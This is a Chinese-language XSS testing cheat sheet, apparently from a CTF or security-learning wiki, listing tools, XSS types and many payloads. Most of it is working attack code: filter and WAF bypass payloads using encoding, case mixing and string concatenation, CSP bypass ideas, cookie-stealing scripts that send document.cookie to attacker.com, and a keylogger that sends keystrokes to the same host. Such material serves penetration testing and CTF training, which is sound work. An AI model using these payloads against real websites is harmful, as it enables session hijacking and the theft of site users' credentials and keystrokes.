# XSS测试工具

跨站脚本攻击(Cross-Site Scripting)是常见的Web漏洞。

## 在线工具

### XSS Hunter
**链接**: [https://xsshunter.com/](https://xsshunter.com/)

**功能**: XSS盲打平台

**特点**:
- 自动收集触发信息
- 获取Cookie、截图等
- 支持盲打场景

### XSS Payload列表
**链接**: [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)

**功能**: XSS Payload集合

**特点**:
- 大量Payload
- 分类清晰
- 持续更新

### PortSwigger XSS速查表
**链接**: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

**功能**: XSS测试向量

**特点**:
- 官方维护
- 覆盖各种浏览器
- 绕过技巧

### XSS Game
**链接**: [https://xss-game.appspot.com/](https://xss-game.appspot.com/)

**功能**: Google的XSS学习游戏

**特点**:
- 6个关卡
- 逐步深入
- 寓教于乐

## XSS类型

### 1. 反射型XSS (Reflected XSS)
**特点**:
- 非持久化
- 通过URL参数传递
- 需要用户点击

**示例**:
```html
http://example.com/search?q=<script>alert(1)</script>
```

### 2. 存储型XSS (Stored XSS)
**特点**:
- 持久化存储
- 危害最大
- 影响所有访问用户

**场景**:
- 留言板
- 个人资料
- 评论功能

### 3. DOM型XSS
**特点**:
- 不经过服务器
- 纯前端触发
- 通过JavaScript操作DOM

**示例**:
```javascript
// 脆弱代码
document.write(location.hash.substring(1));

// 利用
http://example.com/#<script>alert(1)</script>
```

## 常用Payload

### 基础测试
```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
```

### 绕过过滤

#### 大小写混合
```html
<ScRiPt>alert(1)</sCrIpT>
```

#### 编码绕过
```html
<!-- HTML实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Unicode编码 -->
<script>alert(1)</script>

<!-- 十六进制 -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
```

#### 事件处理器
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

#### 无script标签
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
```

#### 无括号
```html
<script>alert`1`</script>
<script>throw onerror=alert,'1'</script>
```

#### 无空格
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

#### 长度限制
```html
<!-- 最短XSS -->
<script>alert()</script>  <!-- 26字符 -->
<svg onload=alert()>      <!-- 20字符 -->
<script src=//⑭.₨></script>  <!-- 更短,但需要外部JS -->
```

### Cookie窃取
```html
<script>
new Image().src='http://attacker.com/?c='+document.cookie;
</script>

<script>
fetch('http://attacker.com/?c='+document.cookie);
</script>
```

### 键盘记录
```html
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/?key='+e.key);
}
</script>
```

## 绕过WAF技巧

### 1. 注释混淆
```html
<script><!--
alert(1)
//--></script>
```

### 2. 换行符
```html
<script>
alert
(
1
)
</script>
```

### 3. 字符串拼接
```javascript
<script>eval('ale'+'rt(1)')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### 4. 双重编码
```html
%253Cscript%253Ealert(1)%253C/script%253E
```

### 5. 利用浏览器特性
```html
<!-- IE -->
<img src=x onerror=alert(1) language=vbscript>

<!-- Chrome/Safari -->
<script>alert(1)//
```

## 防御措施识别

### 输入过滤
- 黑名单: 寻找遗漏的标签/属性
- 白名单: 寻找可利用的允许标签

### 输出编码
- HTML编码
- JavaScript编码
- URL编码

### CSP (内容安全策略)
```html
Content-Security-Policy: default-src 'self'
```

**绕过思路**:
- 寻找同域的JSONP端点
- 利用允许的CDN
- base标签劫持

### HttpOnly Cookie
无法通过JavaScript获取Cookie，但可以:
- 发起请求(CSRF)
- 读取页面内容
- 键盘记录

## CTF解题技巧

!!! tip "测试流程"
    1. 找到输入点和输出点
    2. 测试基础payload
    3. 识别过滤规则
    4. 构造绕过payload
    5. 获取目标数据

!!! tip "常见考点"
    - HTML实体编码/解码
    - JavaScript编码
    - CSP绕过
    - 过滤器绕过
    - DOM XSS
    - mXSS (突变XSS)

!!! warning "调试技巧"
    - 使用浏览器开发者工具
    - 查看HTML源码
    - 控制台测试JavaScript
    - 网络面板查看请求
    - Burp Suite拦截修改
